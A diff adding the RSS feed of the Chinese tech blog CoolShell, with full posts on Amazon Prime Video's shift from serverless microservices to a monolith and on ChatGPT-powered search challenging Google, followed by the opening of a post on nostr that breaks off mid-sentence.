@@ -1,0 +1,2359 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>酷 壳 &#8211; CoolShell</title>
+	<atom:link href="https://coolshell.cn/feed" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Tue, 09 May 2023 04:25:32 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>是微服务架构不香还是云不香？</title>
+		<link>https://coolshell.cn/articles/22422.html</link>
+					<comments>https://coolshell.cn/articles/22422.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 08 May 2023 09:52:06 +0000</pubDate>
+				<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[系统架构]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[Lambda]]></category>
+		<category><![CDATA[Microservice]]></category>
+		<category><![CDATA[Serverless]]></category>
+		<category><![CDATA[Step Function]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22422</guid>
+
+					<description><![CDATA[<p>这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《规模化Prime Video的音视频监控服...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22422.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22422.html">是微服务架构不香还是云不香？</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-22424" src="https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-300x200.png" alt="" width="300" height="200" srcset="https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-300x200.png 300w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-768x512.png 768w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-405x270.png 405w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices.png 800w" sizes="(max-width: 300px) 100vw, 300px" />这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《<a title="Scaling up the Prime Video audio/video monitoring service and reducing costs by 90%" href="https://www.primevideotech.com/video-streaming/scaling-up-the-prime-video-audio-video-monitoring-service-and-reducing-costs-by-90" target="_blank" rel="noopener">规模化Prime Video的音视频监控服务，成本降低90%</a>》，副标题：“<strong>从分布式微服务架构到单体应用程序的转变有助于实现更高的规模、弹性和降低成本</strong>”，有人把这篇文章在五一期间转到了<a href="https://www.reddit.com/r/programming/comments/137alxn/prime_video_switched_from_serverless_to_ec2_and/" target="_blank" rel="noopener">reddit</a> 和 <a href="https://news.ycombinator.com/item?id=35811741" target="_blank" rel="noopener">hacker news</a> 上，在Reddit上热议。这种话题与业内推崇的微服务架构形成了鲜明的对比。从“微服务架构”转“单体架构”，还是Amazon干的，这个话题足够劲爆。然后DHH在刚<a href="https://twitter.com/dhh/status/1655076668787097607" target="_blank" rel="noopener">喷完Typescript</a>后继续发文《<a href="https://world.hey.com/dhh/even-amazon-can-t-make-sense-of-serverless-or-microservices-59625580" target="_blank" rel="noopener">即便是亚马逊也无法理解Servless或微服务</a>》，继续抨击微服务架构，于是，瞬间引爆技术圈，登上技术圈热搜。</p>
+<p>今天上午有好几个朋友在微信里转了三篇文章给我，如下所示：</p>
+<ul>
+<li>《<a href="https://mp.weixin.qq.com/s/mEmz8pviahEAWy1-SA8vcg" target="_blank" rel="noopener">微服务是不是个蠢主意？</a>》</li>
+<li>《<a href="https://mp.weixin.qq.com/s/7zm5YyeZhQ2mu2TJvOK5tQ" target="_blank" rel="noopener">单体回归？亚马逊放弃用于视频监控的微服务</a> 》</li>
+<li>《<a href="https://mp.weixin.qq.com/s/fQtAMf4BfJxdBPWDE5ygwg" target="_blank" rel="noopener">从微服务转为单体架构、成本降低 90%，亚马逊内部案例引发轰动</a>》</li>
+</ul>
+<p>看看这些标题就知道这些文章要的是流量而不是好好写篇文章。看到第二篇，你还真当 Prime Video 就是 Amazon 的全部么？然后，再看看这些文章后面的跟风评论，我觉得有 80%的人只看标题，而且是连原文都不看的。所以，我想我得写篇文章了……</p>
+<p><span id="more-22422"></span></p>
+<h4>原文解读</h4>
+<p>要认清这个问题首先是要认认真真读一读原文，Amazon Prime Video 技术团队的这篇文章并不难读，也没有太多的技术细节，但核心意思如下：</p>
+<p>1）<strong>这个系统是一个监控系统，用于监控数据千条用户的点播视频流</strong>。主要是监控整个视频流运作的质量和效果（比如：视频损坏或是音频不同步等问题），这个监控主要是处理视频帧，所以，他们有一个微服务主要是用来把视频拆分成帧，并临时存在 S3 上，就是下图中的 Media Conversion 服务。</p>
+<p>2）<strong>为了快速搭建系统，Prime Video团队使用了Serverless 架构，也就是著名的 AWS Lambda 和 AWS Step Functions</strong>。前置 Lambda 用来做用户请求的网关，Step Function 用来做监控（探测器），有问题后，就发 SNS 上，Step Function 从 S3 获取 Media Conversion 的数据，然后把运行结果再汇总给一个后置的 Lambda ，并存在 S3 上。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-22423 " src="https://coolshell.cn/wp-content/uploads/2023/05/prime.01.webp" alt="" width="624" height="496" srcset="https://coolshell.cn/wp-content/uploads/2023/05/prime.01.webp 1011w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-300x238.webp 300w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-768x610.webp 768w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-340x270.webp 340w" sizes="(max-width: 624px) 100vw, 624px" /></p>
+<p>整个架构看上去非常简单 ，一点也不复杂，而且使用了 Serverless 的架构，一点服务器的影子都看不见。<strong>实话实说，这样的开发不香吗？我觉得很香啊，方便快捷，完全不理那些无聊的基础设施，直接把代码转成服务，然后用 AWS 的 Lamda + Step Function + SNS + S3 分分钟就搭出一个有模有样的监控系统了，哪里不好了？！</strong></p>
+<p>但是他们遇到了一个比较大的问题，就是 AWS Step Function 的伸缩问题，从文章中我看到了两个问题（注意前方高能）：</p>
+<ol>
+<li>需要很多很多的并发的 AWS Step Function ，于是达到了帐户的 hard limit。</li>
+<li>AWS Step Function 按状态转换收费，所以，贵得受不了了。</li>
+</ol>
+<p>注意，这里有两个关键点：1）<strong>帐户对 Step Function 有限制</strong>，2）<strong>Step Function 太贵了用不起</strong>。</p>
+<p>然后，Prime Video 的团队开始解决问题，下面是解决的手段：</p>
+<p>1） 把 Media Conversion  和 Step Function 全部写在一个程序里，Media Conversion 跟 Step Function 里的东西通过内存通信，不再走S3了。结果汇总到一个线程中，然后写到 S3.</p>
+<p>2）把上面这个单体架构进行分布式部署，还是用之前的 AWS Lambda 来做入门调度。</p>
+<p>EC2 的水平扩展没有限制，而且你想买多少 CPU/MEM 的机器由你说了算，而这些视频转码，监控分析的功能感觉就不复杂，本来就应该写在一起，这么做不更香吗？当然更香，比前面的 Serverless 的确更香，因为如下的几个原因：</p>
+<ol>
+<li>不再受 Step Function 的限制了，技术在自己手里，有更大的自由度。</li>
+<li>没有昂贵的 Step Function 云成本的确变得更低了，如果你把 Lambda 换成 Nginx 或 Spring Gateway 或是我司的 <a href="https://github.com/megaease/easegress" target="_blank" rel="noopener">Easegress</a>，你把 S3 换成 MinIO，你把 SNS 换成 Kafka，你的成本 还能再低。</li>
+</ol>
+<h4>独立思考</h4>
+<p>好了，原文解读完了，你有自己的独立思考了吗？下面是我的独立思考，供你参考：</p>
+<p>1）<strong>AWS 的 Serverless 也好， 微服务也好，单体也好，在合适的场景也都很香</strong>。这就跟汽车一样，跑车，货车，越野车各有各的场景，你用跑车拉货，还是用货车泡妞都不是一个很好的决定。</p>
+<p>2）<strong>这篇文章中的这个例子中的业务太过简单了，本来就是一两个服务就可以干完的事。</strong>就是一个转码加分析的事，要分开的话，就两个微服务就好了（一个转码一个分析），做成流式的。如果不想分，合在一起也没问题了，这个粒度是微服务没毛病。微服务的划分有好些原则，我这里只罗列几个比较重要的原则：</p>
+<ul>
+<li><strong>边界上下文</strong>。微服务的粒度不能大于领域驱动里的 Bounded Context（具体是什么 大家自行 Google），也就是一个业务域。</li>
+<li><strong>单一职责，高内聚，低耦合</strong>。把因为相同原因变化的合在一起（内聚），把不同原因变化的分开（解耦）</li>
+<li><strong>事务和一致性</strong>。对于两个重度依赖的功能，需要完成一个事务和要保证强一致性的，最好不要拆开，要放在一起。</li>
+<li><strong>跟组织架构匹配</strong>。把同一个团队的东西放在一起，不同团队的分开。</li>
+</ul>
+<p>3）<strong>Prime Video 遇到的问题不是技术问题，而是 AWS  Step Function 处理能力不足，而且收费还很贵的问题</strong>。这个是 AWS 的产品问题，不是技术问题。或者说，这个是Prime Video滥用了Step Function的问题（本来这种大量的数据分析处理就不适合Step Function）。所以，大家不要用一个产品问题来得到微服务架构有问题的结论，这个没有因果关系。<strong>试问，如果 Step Funciton 可以无限扩展，性能也很好，而且白菜价，那么 Prime Video 团队还会有动力改成单体吗？他们不会反过来吹爆 Serverless 吗？</strong></p>
+<p>4）Prime Video 跟 AWS 是两个独立核算的公司，就像 Amazon 的电商和 AWS 一样，也是两个公司。Amazon 的电商和 AWS 对服务化或是微服务架构的理解和运维，我个人认为这个世界上再也找不到另外一家公司了，包括 Google 或 Microsoft。你有空可以看看本站以前的这篇文章《<a title="SteveY对Amazon和Google平台的吐槽" href="https://coolshell.cn/articles/5701.html">Steve Yegg对Amazon和Google平台的吐槽</a>》你会了解的更多。</p>
+<p>5）<strong>Prime Video 这个案例本质上是“下云”，下了 AWS Serverless 的云</strong>。云上的成本就是高，一个是费用问题，另一个是被锁定的问题。Prime Video 团队应该很庆幸这个监控系统并不复杂，重写起来也很快，所以，可以很快使用一个更传统的“服务化”+“云计算”的分布式架构，不然，就得像 DHH 那样咬牙下云——《<a href="https://world.hey.com/dhh/why-we-re-leaving-the-cloud-654b47e0" target="_blank" rel="noopener">Why We&#8217;re Leaving the Cloud</a>》（他们的 SRE 的这篇博文 <a href="https://dev.37signals.com/our-cloud-spend-in-2022/" target="_blank" rel="noopener">Our Cloud Spend in 2022</a>说明了下云的困难和节约了多少成本）</p>
+<h4>后记</h4>
+<p>最后让我做个我自己的广告。我在过去几年的创业中，帮助了很多公司解决了这些 分布式，微服务，云原生以及云计算成本的问题，如果你也有类似问题。欢迎，跟我联系：<a href="mailto:haoel@hotmail.com">haoel@hotmail.com</a></p>
+<p>另外，我们今年发布了一个平台 MegaEase Cloud，<strong> 就是想让用户在不失去云计算体验的同时，通过自建高可用基础架构的方式来获得更低的成本（至少降 50%的云计算成本）。</strong>目前可以降低成本的方式：</p>
+<ol>
+<li>基础软件：通过开源软件自建，</li>
+<li>内容分发：MinIO + Cloudflare 的免费 CDN，</li>
+<li>马上准备发布的直接与底层IDC合作的廉价GPU计算资源…</li>
+</ol>
+<p><strong>欢迎大家试用。</strong></p>
+<p><strong>如何访问</strong></p>
+<ul>
+<li>中国区:   <a href="https://cloud.megaease.cn" target="_blank" rel="noopener">https://cloud.megaease.cn </a></li>
+<li>国际区：<a href="https://cloud.megaease.com" target="_blank" rel="noopener">https://cloud.megaease.com</a></li>
+</ul>
+<p><strong>注：这两个区完全独立，帐号不互通。因为网络的不可抗力，千万不要跨区使用。</strong></p>
+<p><strong>产品演示</strong></p>
+<ul>
+<li><a href="https://www.bilibili.com/video/BV17v4y1R7mA/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV17v4y1R7mA/</a></li>
+</ul>
+<p><strong>介绍文章</strong></p>
+<ul>
+<li><a href="https://megaease.cn/zh/blog/2023/02/15/welcome-to-megaease-cloud/" target="_blank" rel="noopener">欢迎使用 MegaEase Cloud </a></li>
+<li><a href="https://megaease.cn/zh/blog/2023/04/06/megaease-cloud-2023.03-significant-update/" target="_blank" rel="noopener">2023 年 03 月重大更新</a></li>
+</ul>
+<p>&nbsp;</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17737.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/03/Amazon-Web-Services-Down-150x150.png" alt="AWS 的 S3 故障回顾和思考" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17737.html" class="wp_rp_title">AWS 的 S3 故障回顾和思考</a></li><li ><a href="https://coolshell.cn/articles/10476.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/10/huarong-150x150.png" alt="C++11的Lambda使用一例：华容道求解" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10476.html" class="wp_rp_title">C++11的Lambda使用一例：华容道求解</a></li><li ><a href="https://coolshell.cn/articles/4601.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg" alt="关于Amazon云宕机的网贴收集" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4601.html" class="wp_rp_title">关于Amazon云宕机的网贴收集</a></li><li ><a href="https://coolshell.cn/articles/11.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="PHP v5.3的新鲜玩意" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11.html" class="wp_rp_title">PHP v5.3的新鲜玩意</a></li><li ><a href="https://coolshell.cn/articles/1928.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg" alt="如何使用Python操作摄像头" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1928.html" class="wp_rp_title">如何使用Python操作摄像头</a></li><li ><a href="https://coolshell.cn/articles/3277.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="超强的验证码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3277.html" class="wp_rp_title">超强的验证码</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22422.html">是微服务架构不香还是云不香？</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22422.html/feed</wfw:commentRss>
+			<slash:comments>155</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>我看ChatGPT: 为啥谷歌掉了千亿美金</title>
+		<link>https://coolshell.cn/articles/22398.html</link>
+					<comments>https://coolshell.cn/articles/22398.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sat, 11 Feb 2023 16:31:16 +0000</pubDate>
+				<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[ChatGPT]]></category>
+		<category><![CDATA[Google]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22398</guid>
+
+					<description><![CDATA[<p>两个月前，我试着想用 ChatGPT 帮我写篇文章《eBPF 介绍》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22398.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22398.html">我看ChatGPT: 为啥谷歌掉了千亿美金</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-22405" src="https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-300x200.jpg" alt="" width="300" height="200" srcset="https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-300x200.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-768x511.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-406x270.jpg 406w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.jpg 900w" sizes="(max-width: 300px) 100vw, 300px" />两个月前，我试着想用 ChatGPT 帮我写篇文章《<a title="eBPF 介绍" href="https://coolshell.cn/articles/22320.html">eBPF 介绍</a>》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所以，从那天开始我说我不会再用 ChatGPT 来写文章（这篇文章不是由 ChatGPT 生成），因为，在试过一段时间后，我对 ChatGTP 有基于如下的认识：</p>
+<ol>
+<li><strong>ChatGPT 不是基于事实，是基于语言模型的</strong>，事实对他来说不重要，对他重要的是他能读懂你的问题，并按照一定的套路回答你的问题。</li>
+<li><strong>因为是基于套路的回答，所以，他并不能保证内容是对的，他的目标是找到漂亮的精彩的套路</strong>，于是，你会发现，他的内容组织能力和表述还不错，但是只要你认真玩上一段时间，你会发现，ChatGPT 那些表述的套路其实也比较平常一般。它的很多回答其实都不深，只能在表面上。就像 Github 的 Copilot 一样，写不了什么高级的代码，只能帮你写一些常规格式化的代码（当然，这也够了）</li>
+</ol>
+<figure id="attachment_22417" aria-describedby="caption-attachment-22417" style="width: 640px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-22417 size-large" src="https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-1024x853.jpg" alt="" width="640" height="533" srcset="https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-1024x853.jpg 1024w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-300x250.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-768x640.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-324x270.jpg 324w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example.jpg 1220w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-22417" class="wp-caption-text">ChatGPT 就是一个语言模型，如果不给他足够的数据和信息，它基本就是在胡编乱造</figcaption></figure>
+<p>所以，基于上面这两个点认识，以发展的眼光来看问题，我觉得 ChatGPT 这类的 AI 可以成为一个小助理，他的确可以干掉那些初级的脑力工作者，但是，还干不掉专业的人士，这个我估计未来也很难，不过，这也很帅了，因为大量普通的工作的确也很让人费时间和精力，<strong>但是有个前提条件——就是ChatGPT所产生的内容必需是真实可靠的，没有这个前提条件的话，那就什么用也没有了</strong>。</p>
+<p>今天，我想从另外一个角度来谈谈 ChatGPT，尤其是我在Youtube上看完了微软的发布会《<a href="https://youtu.be/rOeRWRJ16yY" target="_blank" rel="noopener">Introducing your copilot for the web: AI-powered Bing and Microsoft Edge</a> 》，才真正意识到Google 的市值为什么会掉了1000亿美元，是的，<strong>谷歌的搜索引擎的霸主位置受到了前所未有的挑战</strong>……</p>
+<p><span id="more-22398"></span></p>
+<p>我们先来分析一下搜索引擎解决了什么样的用户问题，在我看来搜索引擎解决了如下的问题：</p>
+<ul>
+<li><strong>知识或信息索引</strong>。查新闻，查股票，查历史，查文档，找答案……</li>
+<li><strong>找服务提供商</strong>。找卖东西的电商，找帮你修东西的服务，找软件……</li>
+<li><strong>信息的准确和可靠</strong>。搜索引擎的rank算法保证了最准确、最有用、最权威的信息出现在最前面……（作恶的百度不在此列）</li>
+</ul>
+<p>基本上就是上面这几个，搜索引擎在上面这几件事上作的很好，但是，还是有一些东西搜索引擎做的并不好，如：</p>
+<ul>
+<li><strong>搜索引擎是基于关键词的，不是基于语义的</strong>。所以，搜索引擎并不知道你的真实需求，因此，你会不可避免地要干下面的事，
+<ul>
+<li>你经常要不断地增加或调整不同的关键词来提高查询信息的准确度……</li>
+<li>你经常要在你查找的信息中进行二次或多次过滤和筛选……</li>
+</ul>
+</li>
+<li><strong>搜索引擎是只能呈现内容，无法解读内容</strong>。所以，你找到相关的链接后，你还要花大量的时间来阅读理解，经常性的你不可避免的要干下面的事：
+<ul>
+<li>打开一个链接，读到了一大半后，发现你要的内容不在其中，只能关掉再打开一个……</li>
+<li>你想要的内容是在的，但是太晦涩，看不懂，太费解，你要找小白友好的版本……</li>
+<li>你想要的内容不完整，你需要在很多个链接和网页上做拼图游戏……</li>
+<li>内容是无法结构化的展示的，你搜到的东西全都是碎片信息</li>
+</ul>
+</li>
+<li><strong>搜索引擎没有上下文关联，两次搜索是没有关系的</strong>。也就是说，人知道的越多，问题也就越多，所以，我们经常会面临下面的问题：
+<ul>
+<li>随着我了解的越多，我的信息搜索的会出现分支，这个分支只有我自己的管理，搜索引擎是不关心的，导致我每次都相当于从头开始……</li>
+<li>你做计划的时候，你需要从多个不同的搜索中获取你想要的东西，最终组合成你定制化的东西，比如做旅游计划……</li>
+</ul>
+</li>
+</ul>
+<p>好了，我们知道，<strong>ChatGPT 这类的技术主要是用来根据用户的需求来按一定的套路来“生成内容”的</strong>，只是其中的内容并不怎么可靠，那么，如果把搜索引擎里靠谱的内容交给 ChatGPT 呢？那么，这会是一个多么强大的搜索引擎啊，完全就是下一代的搜索引擎，上面的那些问题完全都可以解决了：</p>
+<ul>
+<li>你可以打一段话给搜索引擎，ChatGPT 是读得懂语义的。</li>
+<li>因为知道语义，于是在众多搜过结果中，他更知道哪些是你想要的内容。</li>
+<li>ChatGPT 可以帮你生成 <a href="https://en.wikipedia.org/wiki/TL;DR" target="_blank" rel="noopener">TL;DR</a>，把长文中的要求总结出来形成更易读的短文</li>
+<li>ChatGPT 可以帮你整理内容，在多个网页中帮你整合和结构化内容</li>
+<li>ChatGPT 可以有上下文对话，你可以让他帮你不断通过更多的关键词搜索信息，并在同一个主题下生成、组织和优化内容</li>
+</ul>
+<p><strong>一旦 ChatGPT 利用上了搜索引擎内容准确和靠谱的优势，那么，ChatGPT 的能力就完全被释放出来了，所以，带 ChatGPT 的搜索引擎，就是真正的“如虎添翼”！</strong></p>
+<p>因此，微软的 Bing + ChatGPT，成为了 Google 有史以来最大的挑战者，我感觉——所有跟信息或是文字处理相关的软件应用和服务，都会因为 ChatGPT 而且全部重新洗一次牌的，这应该会是新一轮的技术革命……<strong>Copilot 一定会成为下一代软件和应用的标配！</strong></p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264-150x150.jpg" alt="Google Inbox如何跨平台重用代码？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a></li><li ><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/04/Google-Person-Finder-150x150.png" alt="PFIF网上寻人协议" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a></li><li ><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="来信， 创业 和 移动互联网" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a></li><li ><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="SteveY对Amazon和Google平台的吐槽" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_title">SteveY对Amazon和Google平台的吐槽</a></li><li ><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg" alt="一些文章和各种资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a></li><li ><a href="https://coolshell.cn/articles/3806.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/C_String-150x150.jpg" alt="Google图片搜索下的的C String" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3806.html" class="wp_rp_title">Google图片搜索下的的C String</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22398.html">我看ChatGPT: 为啥谷歌掉了千亿美金</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22398.html/feed</wfw:commentRss>
+			<slash:comments>21</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>聊聊 nostr 和 审查</title>
+		<link>https://coolshell.cn/articles/22367.html</link>
+					<comments>https://coolshell.cn/articles/22367.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 03 Feb 2023 07:46:13 +0000</pubDate>
+				<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[系统架构]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[censorship]]></category>
+		<category><![CDATA[network]]></category>
+		<category><![CDATA[nostr]]></category>
+		<category><![CDATA[social media]]></category>
+		<category><![CDATA[Twitter]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22367</guid>
+
+					<description><![CDATA[<p>这两天在网络上又有一个东西火了，Twitter 的创始人 @jack 新的社交 iOS App  Damus 上苹果商店（第二天就因为违反中国法律在中国区下架了...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22367.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22367.html">聊聊 nostr 和 审查</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-22368" src="https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-300x150.png" alt="" width="300" height="150" srcset="https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-300x150.png 300w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-1024x512.png 1024w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-768x384.png 768w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-540x270.png 540w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1.png 1140w" sizes="(max-width: 300px) 100vw, 300px" />这两天在网络上又有一个东西火了，Twitter 的创始人 <a href="https://twitter.com/jack">@jack</a> 新的社交 iOS App  <a href="https://apps.apple.com/ca/app/damus/id1628663131" target="_blank" rel="noopener">Damus</a> 上苹果商店（第二天就因为违反中国法律在中国区下架了），这个软件是一个去中心化的 Twitter，使用到的是 nostr &#8211; Notes and Other Stuff Transmitted by Relays 的协议（<a href="https://github.com/nostr-protocol/nostr" target="_blank" rel="noopener">协议简介</a>，<a href="https://github.com/nostr-protocol/nips" target="_blank" rel="noopener">协议细节</a>），协议简介中有很大的篇幅是在批评Twitter和其相类似的中心化的产品，如：<a href="https://mastodon.social/" target="_blank" rel="noopener">Mastodon</a> 和 <a href="https://scuttlebutt.nz/" target="_blank" rel="noopener">Secure Scuttlebutt</a> 